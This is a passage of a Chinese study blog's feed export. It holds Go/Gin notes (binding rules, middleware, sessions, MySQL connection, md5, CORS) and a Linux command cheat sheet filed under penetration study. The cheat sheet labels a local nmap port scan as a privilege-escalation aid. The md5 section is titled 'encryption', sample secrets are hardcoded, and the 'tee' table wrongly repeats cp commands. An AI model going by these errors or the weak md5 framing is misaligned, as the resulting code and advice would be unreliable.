<td><code>Form</code> 表单</td>
<td><code>ShouldBind()</code></td>
<td>POST 表单（默认方式）</td>
</tr>
<tr>
<td><code>JSON</code> 请求体</td>
<td><code>ShouldBindJSON()</code></td>
<td><code>application/json</code></td>
</tr>
<tr>
<td><code>URI</code> 路径参数</td>
<td><code>ShouldBindUri()</code></td>
<td><code>/user/:id/:name</code></td>
</tr>
<tr>
<td>通用自动识别</td>
<td><code>ShouldBind()</code></td>
<td>根据 <code>Content-Type</code> 自动</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>标签名</th>
<th>来源</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>form:&quot;&quot;</code></td>
<td>query/form-data</td>
</tr>
<tr>
<td><code>json:&quot;&quot;</code></td>
<td>JSON 请求体</td>
</tr>
<tr>
<td><code>uri:&quot;&quot;</code></td>
<td>URL 路径参数</td>
</tr>
<tr>
<td><code>binding:&quot;required&quot;</code></td>
<td>必填验证</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>规则名</th>
<th>作用说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>required</code></td>
<td>必填字段</td>
<td><code>binding:&quot;required&quot;</code></td>
</tr>
<tr>
<td><code>omitempty</code></td>
<td>若字段为空则跳过后续校验（与其他配合）</td>
<td><code>binding:&quot;omitempty,email&quot;</code></td>
</tr>
<tr>
<td><code>gt=X</code></td>
<td>大于 X（数字）</td>
<td><code>binding:&quot;gt=0&quot;</code></td>
</tr>
<tr>
<td><code>lt=X</code></td>
<td>小于 X</td>
<td><code>binding:&quot;lt=100&quot;</code></td>
</tr>
<tr>
<td><code>gte=X</code></td>
<td>大于等于 X</td>
<td><code>binding:&quot;gte=1&quot;</code></td>
</tr>
<tr>
<td><code>lte=X</code></td>
<td>小于等于 X</td>
<td><code>binding:&quot;lte=10&quot;</code></td>
</tr>
<tr>
<td><code>min=X</code></td>
<td>字符串/数组 最小长度</td>
<td><code>binding:&quot;min=6&quot;</code></td>
</tr>
<tr>
<td><code>max=X</code></td>
<td>字符串/数组 最大长度</td>
<td><code>binding:&quot;max=20&quot;</code></td>
</tr>
<tr>
<td><code>len=X</code></td>
<td>精确长度要求</td>
<td><code>binding:&quot;len=11&quot;</code></td>
</tr>
<tr>
<td><code>eq=X</code></td>
<td>必须等于 X（常用于固定值）</td>
<td><code>binding:&quot;eq=男&quot;</code></td>
</tr>
<tr>
<td><code>ne=X</code></td>
<td>不等于 X</td>
<td><code>binding:&quot;ne=无效&quot;</code></td>
</tr>
<tr>
<td><code>email</code></td>
<td>邮箱格式</td>
<td><code>binding:&quot;required,email&quot;</code></td>
</tr>
<tr>
<td><code>url</code></td>
<td>合法的 URL</td>
<td><code>binding:&quot;url&quot;</code></td>
</tr>
<tr>
<td><code>uuid</code></td>
<td>合法 UUID 格式</td>
<td><code>binding:&quot;uuid&quot;</code></td>
</tr>
<tr>
<td><code>oneof=val1 val2</code></td>
<td>限定枚举值</td>
<td><code>binding:&quot;oneof=男 女&quot;</code></td>
</tr>
<tr>
<td><code>datetime=2006-01-02</code></td>
<td>自定义时间格式校验</td>
<td><code>binding:&quot;datetime=2006-01-02&quot;</code></td>
</tr>
<tr>
<td><code>numeric</code></td>
<td>必须为数字（字符串型）</td>
<td><code>binding:&quot;numeric&quot;</code></td>
</tr>
<tr>
<td><code>boolean</code></td>
<td>必须为布尔值（true/false）</td>
<td><code>binding:&quot;boolean&quot;</code></td>
</tr>
</tbody>
</table>
<h3 id="6中间件"><a class="markdownIt-Anchor" href="#6中间件"></a> 6.中间件:</h3>
<table>
<thead>
<tr>
<th>分类</th>
<th>示例与写法</th>
<th>说明与作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>使用方式</strong></td>
<td><code>r.Use(middleware)``group.Use(middleware)</code></td>
<td>全局或局部（某个分组）使用</td>
</tr>
<tr>
<td><strong>定义方式</strong></td>
<td><code>go&lt;br&gt;func MyMiddleware() gin.HandlerFunc &#123;&lt;br&gt;  return func(c *gin.Context) &#123;&lt;br&gt;    // 前置逻辑&lt;br&gt;    c.Next()&lt;br&gt;    // 后置逻辑&lt;br&gt;  &#125;&lt;br&gt;&#125;</code></td>
<td><code>c.Next()</code> 控制是否继续后续处理</td>
</tr>
<tr>
<td><strong>终止请求</strong></td>
<td><code>c.Abort()</code> / <code>c.AbortWithStatus()``c.AbortWithStatusJSON()</code></td>
<td>中止后续中间件与 handler 执行</td>
</tr>
<tr>
<td><strong>获取请求信息</strong></td>
<td><code>c.Request.URL``c.Request.Header.Get(&quot;X-Token&quot;)``c.ClientIP()</code></td>
<td>常用于日志、认证、限流等场景</td>
</tr>
<tr>
<td><strong>设置上下文值</strong></td>
<td><code>c.Set(&quot;key&quot;, value)</code> → handler 中 <code>c.Get(&quot;key&quot;)</code></td>
<td>在多个中间件/处理器中共享数据</td>
</tr>
<tr>
<td><strong>常见内置中间件</strong></td>
<td><code>gin.Logger()``gin.Recovery()</code></td>
<td>Logger 记录请求信息；Recovery 捕获 panic 防止程序崩溃</td>
</tr>
<tr>
<td><strong>自定义日志中间件</strong></td>
<td><code>go&lt;br&gt;func LoggerMiddleware() gin.HandlerFunc &#123;&lt;br&gt;  return func(c *gin.Context) &#123;&lt;br&gt;    start := time.Now()&lt;br&gt;    c.Next()&lt;br&gt;    log.Printf(&quot;耗时: %v&quot;, time.Since(start))&lt;br&gt;  &#125;&lt;br&gt;&#125;</code></td>
<td>输出处理时间，可加上 IP、路径等信息</td>
</tr>
<tr>
<td><strong>IP 校验中间件示例</strong></td>
<td><code>go&lt;br&gt;func ValidateIP() gin.HandlerFunc &#123;&lt;br&gt;  return func(c *gin.Context) &#123;&lt;br&gt;    if c.ClientIP() != &quot;127.0.0.1&quot; &#123;&lt;br&gt;      c.AbortWithStatusJSON(403, gin.H&#123;&quot;error&quot;: &quot;禁止访问&quot;&#125;)&lt;br&gt;    &#125;&lt;br&gt;  &#125;&lt;br&gt;&#125;</code></td>
<td>拒绝非法 IP 访问，常用于内部接口</td>
</tr>
</tbody>
</table>
<h3 id="7-会话控制"><a class="markdownIt-Anchor" href="#7-会话控制"></a> 7. 会话控制:</h3>
<p>session控制:</p>
<table>
<thead>
<tr>
<th>功能</th>
<th>用法示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>🔧 注册中间件</td>
<td><code>store := cookie.NewStore([]byte(&quot;secret&quot;))``r.Use(sessions.Sessions(&quot;session&quot;, store))</code></td>
<td>绑定 session 中间件，设置加密密钥</td>
</tr>
<tr>
<td>✅ 获取 session 对象</td>
<td><code>session := sessions.Default(c)</code></td>
<td>获取当前请求的 session 实例</td>
</tr>
<tr>
<td>📝 设置键值</td>
<td><code>session.Set(&quot;key&quot;, &quot;value&quot;)</code></td>
<td>保存数据到 session（需 <code>Save()</code>）</td>
</tr>
<tr>
<td>💾 保存 session</td>
<td><code>session.Save()</code></td>
<td>修改 session 后必须调用，才能写入</td>
</tr>
<tr>
<td>📖 获取值</td>
<td><code>val := session.Get(&quot;key&quot;)</code></td>
<td>返回 <code>interface&#123;&#125;</code>，需类型断言</td>
</tr>
<tr>
<td>❌ 删除某个键</td>
<td><code>session.Delete(&quot;key&quot;)``session.Save()</code></td>
<td>删除后需保存</td>
</tr>
<tr>
<td>🧹 清空所有</td>
<td><code>session.Clear()``session.Save()</code></td>
<td>清空 session 中的所有内容</td>
</tr>
<tr>
<td>🔍 获取所有键</td>
<td><code>session.Keys()</code></td>
<td>返回当前 session 的所有键名</td>
</tr>
<tr>
<td>⚠️ 判断是否存在</td>
<td><code>val := session.Get(&quot;key&quot;); if val != nil &#123;...&#125;</code></td>
<td>判断 session 是否存在某项数据</td>
</tr>
</tbody>
</table>
<h2 id="6数据库"><a class="markdownIt-Anchor" href="#6数据库"></a> 6.数据库:</h2>
<h3 id="1连接"><a class="markdownIt-Anchor" href="#1连接"></a> 1.连接:</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> _ &quot;github.com/go-sql-driver/mysql&quot;表示导入安装的依赖，Mysql数据库驱动，，前面加一个下划线，表示导入包但是不使用，相当于init（）初始化。      <span class="comment">---必须加</span></span><br><span class="line"> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>用户名:密码啊<span class="variable">@tcp</span>(ip:端口)<span class="operator">/</span>数据库的名字</span><br><span class="line">dsn :<span class="operator">=</span> &quot;root:123@tcp(127.0.0.1:3306)/test&quot;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>连接数据集</span><br><span class="line">db, err :<span class="operator">=</span> sql.Open(&quot;mysql&quot;, dsn) <span class="operator">/</span><span class="operator">/</span><span class="keyword">open</span>不会检验用户名和密码</span><br></pre></td></tr></table></figure>
<h2 id="7md5加密"><a class="markdownIt-Anchor" href="#7md5加密"></a> 7.md5加密：</h2>
<table>
<thead>
<tr>
<th>项目</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>导入库</td>
<td><code>import &quot;crypto/md5&quot;</code></td>
</tr>
<tr>
<td>输出编码</td>
<td>一般搭配 <code>encoding/hex</code> 或 <code>fmt.Sprintf(&quot;%x&quot;, ...)</code> 转换为十六进制字符串</td>
</tr>
<tr>
<td>输入类型</td>
<td><code>[]byte</code></td>
</tr>
<tr>
<td>哈希对象</td>
<td><code>md5.New()</code> 返回一个 hash.Hash 接口对象</td>
</tr>
<tr>
<td>一次性使用方法</td>
<td><code>md5.Sum([]byte)</code>，直接返回长度为 16 的 <code>[16]byte</code></td>
</tr>
</tbody>
</table>
<h2 id="8对跨域请求"><a class="markdownIt-Anchor" href="#8对跨域请求"></a> 8.对跨域请求:</h2>
<h3 id="1安装"><a class="markdownIt-Anchor" href="#1安装"></a> 1.安装:</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/gin-contrib/cors</span><br></pre></td></tr></table></figure>
<h3 id="2使用"><a class="markdownIt-Anchor" href="#2使用"></a> 2.使用:</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用默认 CORS 配置</span></span><br><span class="line"> r.Use(cors.Default())</span><br><span class="line"> <span class="comment">// 或者自定义配置</span></span><br><span class="line"> r.Use(cors.New(cors.Config&#123;</span><br><span class="line">     AllowOrigins:     []<span class="type">string</span>&#123;<span class="string">&quot;http://localhost:3000&quot;</span>, <span class="string">&quot;https://example.com&quot;</span>&#125;,</span><br><span class="line">     AllowMethods:     []<span class="type">string</span>&#123;<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>&#125;,</span><br><span class="line">     AllowHeaders:     []<span class="type">string</span>&#123;<span class="string">&quot;Origin&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Authorization&quot;</span>&#125;,</span><br><span class="line">     ExposeHeaders:    []<span class="type">string</span>&#123;<span class="string">&quot;Content-Length&quot;</span>&#125;,</span><br><span class="line">     AllowCredentials: <span class="literal">true</span>,</span><br><span class="line">     MaxAge: <span class="number">12</span> * time.Hour,</span><br><span class="line"> &#125;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>项目</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>CORS 作用</td>
<td>允许浏览器安全地从一个源请求另一个源的资源</td>
</tr>
<tr>
<td>默认策略</td>
<td>浏览器同源策略不允许跨域请求</td>
</tr>
<tr>
<td>gin解决方案推荐</td>
<td>使用 <code>github.com/gin-contrib/cors</code> 中间件</td>
</tr>
<tr>
<td>AllowOrigins</td>
<td>允许的域名列表，例如 <code>&quot;http://localhost:3000&quot;</code></td>
</tr>
<tr>
<td>AllowMethods</td>
<td>允许的方法，例如 <code>&quot;GET&quot;, &quot;POST&quot;</code></td>
</tr>
<tr>
<td>AllowHeaders</td>
<td>前端可以携带的头，例如 <code>&quot;Authorization&quot;</code></td>
</tr>
<tr>
<td>ExposeHeaders</td>
<td>前端能读取的响应头，例如 <code>&quot;Content-Length&quot;</code></td>
</tr>
<tr>
<td>AllowCredentials</td>
<td>是否允许携带 Cookie、Token 等身份凭证（需搭配具体域名）</td>
</tr>
<tr>
<td>MaxAge</td>
<td>预检请求的缓存时间</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>基础语言</category>
        <category>golang</category>
      </categories>
  </entry>
  <entry>
    <title>linux基础命令</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/linux/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="linux-常用命令"><a class="markdownIt-Anchor" href="#linux-常用命令"></a> linux 常用命令</h1>
<h3 id="1新建虚拟环境"><a class="markdownIt-Anchor" href="#1新建虚拟环境"></a> 1.新建虚拟环境</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入虚拟环境:   source venv/bin/activate</span><br><span class="line">启动一个 screen 会话：screen -S mysession</span><br><span class="line">以后可以用下面的命令重新连接会话： screen -r mysession</span><br></pre></td></tr></table></figure>
<h3 id="2复制文件命令"><a class="markdownIt-Anchor" href="#2复制文件命令"></a> 2.复制文件命令:</h3>
<h4 id="1cp命令"><a class="markdownIt-Anchor" href="#1cp命令"></a> 1.cp命令:</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp [选项] 源文件 目标文件/目录</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>cp a.txt b.txt</code></td>
<td>把 <code>a.txt</code> 复制成 <code>b.txt</code></td>
</tr>
<tr>
<td><code>cp a.txt /tmp/</code></td>
<td>把 <code>a.txt</code> 复制到 <code>/tmp/</code> 目录</td>
</tr>
<tr>
<td><code>cp -r dir1 dir2</code></td>
<td>递归复制目录（必须加 <code>-r</code>）</td>
</tr>
<tr>
<td><code>cp -f a b</code></td>
<td>强制覆盖目标文件</td>
</tr>
<tr>
<td><code>cp -u a b</code></td>
<td>仅当源文件比目标新时才复制（常用于备份）</td>
</tr>
</tbody>
</table>
<h4 id="2tee命令"><a class="markdownIt-Anchor" href="#2tee命令"></a> 2.tee命令:</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command | tee [选项] 文件名</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>cp a.txt b.txt</code></td>
<td>把 <code>a.txt</code> 复制成 <code>b.txt</code></td>
</tr>
<tr>
<td><code>cp a.txt /tmp/</code></td>
<td>把 <code>a.txt</code> 复制到 <code>/tmp/</code> 目录</td>
</tr>
<tr>
<td><code>cp -r dir1 dir2</code></td>
<td>递归复制目录（必须加 <code>-r</code> 选项）</td>
</tr>
<tr>
<td><code>cp -f a b</code></td>
<td>强制覆盖目标文件，无论目标文件是否存在</td>
</tr>
<tr>
<td><code>cp -u a b</code></td>
<td>仅当源文件比目标文件更新时才复制（常用于备份）</td>
</tr>
<tr>
<td><code>cp -i a b</code></td>
<td>在覆盖目标文件前提示用户确认</td>
</tr>
<tr>
<td><code>cp -v a b</code></td>
<td>显示详细的复制过程，列出正在复制的文件</td>
</tr>
<tr>
<td><code>cp -a dir1 dir2</code></td>
<td>复制目录及其内容，保持文件的原始属性（包括符号链接）</td>
</tr>
<tr>
<td><code>cp -l a b</code></td>
<td>创建目标文件的硬链接，而非复制</td>
</tr>
</tbody>
</table>
<h3 id="3删除文件操作"><a class="markdownIt-Anchor" href="#3删除文件操作"></a> 3.删除文件操作</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">| 命令          | 作用                   |</span><br><span class="line">| ------------- | ---------------------- |</span><br><span class="line">| `rm file`     | 删除单个文件           |</span><br><span class="line">| `rm -f file`  | 强制删除，不提示       |</span><br><span class="line">| `rm -r dir`   | 删除目录（递归）       |</span><br><span class="line">| `rm -rf dir`  | 强制删除整个目录       |</span><br><span class="line">| `unlink file` | 删除单文件的轻量命令   |</span><br><span class="line">| `find + rm`   | 删除匹配规则的批量文件 |</span><br><span class="line"></span><br><span class="line">### 4.使用代理</span><br><span class="line"></span><br><span class="line">``` php </span><br><span class="line">./clash -f ./config.yaml                           --直接运行</span><br><span class="line">nohup ./clash -f ./config.yaml &gt; clash.log 2&gt;&amp;1 &amp;       --以后台的方式运行</span><br></pre></td></tr></table></figure>
<h4 id="测试是否成功"><a class="markdownIt-Anchor" href="#测试是否成功"></a> 测试是否成功</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">测试 HTTP 代理端口：</span><br><span class="line">            curl -x http:<span class="comment">//127.0.0.1:7890 https://ipinfo.io</span></span><br><span class="line">测试 SOCKS5 端口：</span><br><span class="line">               curl --socks5 <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7891</span> https:<span class="comment">//ipinfo.io</span></span><br><span class="line">proxychains curl https:<span class="comment">//ipinfo.io</span></span><br></pre></td></tr></table></figure>
<h3 id="5xargs传递输出"><a class="markdownIt-Anchor" href="#5xargs传递输出"></a> 5.xargs传递输出:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">它读取标准输入（stdin）的一行一行内容，然后把它“拼接”到后面的命令后面。</span><br><span class="line">xargs cat =cat 文件1 文件2 文件3 ...</span><br></pre></td></tr></table></figure>
<h3 id="6cat函数类似的-linxu函数"><a class="markdownIt-Anchor" href="#6cat函数类似的-linxu函数"></a> 6.cat函数类似的 —linxu函数</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 </span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">paste: 每一行是两个文件对应行用TAB拼接起来。</span><br><span class="line">rev: 每一行的字符顺序被颠倒输出了。</span><br><span class="line">strings:  -- 会从二进制文件（如可执行文件、.so 文件、图片等）中找出 可打印字符序列（可读文本）。</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
<h3 id="7创建一个文件"><a class="markdownIt-Anchor" href="#7创建一个文件"></a> 7.创建一个文件:</h3>
<table>
<thead>
<tr>
<th>命令示例</th>
<th>作用</th>
<th>特点</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>touch file.txt</code></td>
<td>创建空文件</td>
<td>文件已存在时更新时间戳</td>
</tr>
<tr>
<td><code>echo &quot;hello&quot; &gt; file.txt</code></td>
<td>创建并写入内容</td>
<td>会覆盖已有文件内容</td>
</tr>
<tr>
<td><code>cat &gt; file.txt</code> （输入内容后按 <code>Ctrl+D</code>）</td>
<td>手动输入内容创建文件</td>
<td>适合一次性写多行</td>
</tr>
<tr>
<td><code>printf &quot;flag&#123;123&#125;\n&quot; &gt; flag.txt</code></td>
<td>创建并写入格式化内容</td>
<td>可用于生成 CTF flag 等结构化内容</td>
</tr>
<tr>
<td><code>&gt; empty.txt</code></td>
<td>创建空文件</td>
<td>文件已存在则清空内容</td>
</tr>
<tr>
<td><code>dd if=/dev/zero of=bigfile.bin bs=1M count=10</code></td>
<td>创建指定大小文件</td>
<td>常用于测试、磁盘填充</td>
</tr>
<tr>
<td><code>vi file.php</code> <code>nano file.txt</code></td>
<td>打开编辑器创建</td>
<td>写完保存即可生成文件</td>
</tr>
</tbody>
</table>
<h3 id="8查看进程"><a class="markdownIt-Anchor" href="#8查看进程"></a> 8.查看进程;</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ps aux</code></td>
<td>显示所有用户的所有进程</td>
<td>`ps aux</td>
</tr>
<tr>
<td><code>top</code> / <code>htop</code></td>
<td>实时显示进程动态信息</td>
<td><code>top</code>（<code>htop</code>更美观）</td>
</tr>
<tr>
<td><code>pidof &lt;name&gt;</code></td>
<td>查找某个程序的 PID</td>
<td><code>pidof clash</code></td>
</tr>
<tr>
<td><code>pgrep &lt;pattern&gt;</code></td>
<td>进程名匹配并返回 PID</td>
<td><code>pgrep -fl clash</code></td>
</tr>
<tr>
<td><code>lsof -p &lt;pid&gt;</code></td>
<td>查看某进程打开的文件</td>
<td><code>lsof -p 1234</code></td>
</tr>
<tr>
<td><code>netstat -tunlp</code></td>
<td>查看进程监听端口</td>
<td>`netstat -tunlp</td>
</tr>
<tr>
<td><code>ss -tulnp</code></td>
<td>更快的 <code>netstat</code> 替代</td>
<td>`ss -tulnp</td>
</tr>
<tr>
<td><code>strace -p &lt;pid&gt;</code></td>
<td>跟踪某进程系统调用</td>
<td><code>strace -p 1234</code></td>
</tr>
</tbody>
</table>
<h3 id="9查看端口"><a class="markdownIt-Anchor" href="#9查看端口"></a> 9.查看端口:</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>netstat -tunlp</code></td>
<td>查看所有监听端口 + 对应进程</td>
<td>`netstat -tunlp</td>
</tr>
<tr>
<td><code>ss -tulnp</code></td>
<td>更快的 <code>netstat</code> 替代</td>
<td>`ss -tulnp</td>
</tr>
<tr>
<td><code>lsof -i:&lt;端口&gt;</code></td>
<td>查看端口对应的进程</td>
<td><code>lsof -i:7890</code></td>
</tr>
<tr>
<td><code>fuser &lt;端口&gt;/tcp</code></td>
<td>快速查看哪个PID占用了端口</td>
<td><code>fuser 8080/tcp</code></td>
</tr>
<tr>
<td><code>cat /proc/net/tcp</code></td>
<td>直接读取系统 TCP 表</td>
<td>可写脚本查所有端口状态</td>
</tr>
<tr>
<td><code>nmap 127.0.0.1 -p-</code></td>
<td>扫描本地开放端口</td>
<td>本地横向扫描、提权辅助</td>
</tr>
</tbody>
</table>
<h4 id="1参数相关"><a class="markdownIt-Anchor" href="#1参数相关"></a> 1.参数相关:</h4>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-t</code></td>
<td>TCP</td>
<td>仅显示 TCP 连接</td>
</tr>
<tr>
<td><code>-u</code></td>
<td>UDP</td>
<td>仅显示 UDP 连接</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>Listen</td>
<td>仅显示监听状态（如服务器在等待连接）</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>Numeric</td>
<td>不解析域名/服务名，显示原始IP和端口号（加速、绕过DNS）</td>
</tr>
<tr>
<td><code>-p</code></td>
<td>Process</td>
<td>显示哪个进程（PID/程序名）占用此连接，需要 <code>root</code> 权限</td>
</tr>
</tbody>
</table>
<h3 id="10把帮助信息设置为中文"><a class="markdownIt-Anchor" href="#10把帮助信息设置为中文"></a> 10.把帮助信息设置为中文:</h3>
<h4 id="1下载汉化包"><a class="markdownIt-Anchor" href="#1下载汉化包"></a> 1.下载汉化包;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install language-pack-zh-hans</span><br></pre></td></tr></table></figure>
<p>之后可以这样访问中文:    LANG=zh_CN.UTF-8 netstat --help</p>
<h4 id="2将langzh_cnutf-8设置别名"><a class="markdownIt-Anchor" href="#2将langzh_cnutf-8设置别名"></a> 2.将LANG=zh_CN.UTF-8设置别名;</h4>
<h5 id="1临时设置别名"><a class="markdownIt-Anchor" href="#1临时设置别名"></a> 1.临时设置别名;</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">临时生效（当前终端有效）</span><br><span class="line">          alias chelp=&#x27;LANG=zh_CN.UTF-8&#x27;</span><br></pre></td></tr></table></figure>
<h5 id="2永久生效自动加载"><a class="markdownIt-Anchor" href="#2永久生效自动加载"></a> 2.永久生效（自动加载）</h5>
<p>编辑你的 shell 配置文件：</p>
<ul>
<li>如果你用的是 bash：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure>
<ul>
<li>如果你用的是 zsh：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>
<p>添加这一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">alias chelp=&#x27;LANG=zh_CN.UTF-8&#x27;</span><br></pre></td></tr></table></figure>
<p>保存后让它立即生效：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">source ~/.bashrc   # 或 ~/.zshrc</span><br></pre></td></tr></table></figure>
<h3 id="11ls命令"><a class="markdownIt-Anchor" href="#11ls命令"></a> 11.ls命令</h3>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-l</code></td>
<td>以长格式列出文件详细信息（权限、用户、大小、修改时间等）</td>
</tr>
<tr>
<td><code>-a</code></td>
<td>显示所有文件，包括以 <code>.</code> 开头的隐藏文件</td>
</tr>
<tr>
<td><code>-h</code></td>
<td>与 <code>-l</code> 配合使用，显示人类可读的文件大小（如 1K，234M）</td>
</tr>
<tr>
<td><code>-S</code></td>
<td>按文件大小排序，默认是从大到小</td>
</tr>
<tr>
<td><code>-r</code></td>
<td>反向排序（与 <code>-t</code>、<code>-S</code> 等配合使用时效果明显）</td>
</tr>
<tr>
<td><code>-t</code></td>
<td>按时间排序，最近修改的文件排在前面</td>
</tr>
<tr>
<td><code>-R</code></td>
<td>递归列出子目录内容</td>
</tr>
<tr>
<td><code>-d</code></td>
<td>如果后面跟的是目录，只显示目录本身而不是其内容</td>
</tr>
<tr>
<td><code>-F</code></td>
<td>在文件名后附上符号（如 <code>/</code> 表示目录，<code>*</code> 表示可执行）</td>
</tr>
<tr>
<td><code>-i</code></td>
<td>显示文件的 inode 编号</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>类似 <code>-l</code>，但显示 UID 和 GID 而非用户名和组名</td>
</tr>
<tr>
<td><code>--color=auto</code></td>
<td>给文件名上色（目录蓝色、可执行绿色等），通常默认启用</td>
</tr>
<tr>
<td><code>--time=ctime</code></td>
<td>使用变更时间（ctime）排序，而不是默认的修改时间（mtime）</td>
</tr>
<tr>
<td><code>-1</code></td>
<td>每个文件单独一行显示（默认多个列显示时使用）</td>
</tr>
</tbody>
</table>
<h4 id="ls常用组合"><a class="markdownIt-Anchor" href="#ls常用组合"></a> ls常用组合</h4>
<table>
<thead>
<tr>
<th>命令</th>
<th>用法说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ls -alh</code></td>
<td>列出所有文件 + 详细信息 + 可读大小</td>
</tr>
<tr>
<td><code>ls -lhS</code></td>
<td>按大小排序显示文件</td>
</tr>
<tr>
<td><code>ls -lt</code></td>
<td>按修改时间排序</td>
</tr>
<tr>
<td><code>ls -ltr</code></td>
<td>按时间升序排列（旧文件在前）</td>
</tr>
<tr>
<td><code>ls -R</code></td>
<td>查看当前目录及所有子目录内容</td>
</tr>
</tbody>
</table>
<h3 id="12head命令"><a class="markdownIt-Anchor" href="#12head命令"></a> 12.head命令:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于查看文件或输出的前几行。</span><br><span class="line">head [选项] [文件名]</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-n N</code></td>
<td>显示前 N 行（默认是 10 行）</td>
<td><code>head -n 5 file.txt</code></td>
</tr>
<tr>
<td><code>-c N</code></td>
<td>显示前 N 个字节</td>
<td><code>head -c 20 file.txt</code></td>
</tr>
</tbody>
</table>
<h4 id="14tail-命令"><a class="markdownIt-Anchor" href="#14tail-命令"></a> 14.tail 命令:</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于查看文件或输出的最后几行。</span><br><span class="line">tail [选项] [文件名]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-n N</code></td>
<td>显示最后 N 行（默认 10 行）</td>
<td><code>tail -n 5 error.log</code></td>
</tr>
<tr>
<td><code>-c N</code></td>
<td>显示最后 N 个字节</td>
<td><code>tail -c 100 file.txt</code></td>
</tr>
<tr>
<td><code>-f</code></td>
<td>实时输出追加的内容（日志监控）</td>
<td><code>tail -f /var/log/syslog</code></td>
</tr>
<tr>
<td><code>+N</code></td>
<td>从第 N 行开始显示（常用于搭配 <code>tail -n +2</code>）</td>
<td><code>tail -n +2 file.txt</code></td>
</tr>
</tbody>
</table>
<h2 id="13创建一个新用户并设置密码与权限"><a class="markdownIt-Anchor" href="#13创建一个新用户并设置密码与权限"></a> 13.创建一个新用户，并设置密码与权限</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建新用户</span><br><span class="line">        sudo adduser 用户名</span><br><span class="line">设置用户密码（如果没设置成功或要修改）</span><br><span class="line">         sudo passwd 用户名</span><br><span class="line">赋予权限（加入特定组）       </span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>权限类型</th>
<th>命令</th>
